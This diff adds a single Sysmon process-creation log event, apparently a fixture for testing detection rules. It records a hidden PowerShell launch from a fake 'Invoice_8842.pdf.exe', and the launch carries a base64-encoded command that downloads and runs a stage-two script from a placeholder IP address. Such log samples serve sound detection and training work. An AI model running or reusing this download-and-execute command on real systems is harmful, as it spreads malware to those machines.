@@ -1,0 +1,12 @@
+[
+ {
+  "@timestamp": "2026-11-03T09:22:00.000Z",
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "EventID": 1,
+  "Computer": "WS-0423",
+  "User": "priya.n",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA2ADYAOgA4ADAAOAAxAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
+  "ParentImage": "C:\\Users\\priya.n\\Downloads\\Invoice_8842.pdf.exe"
+ }
+]
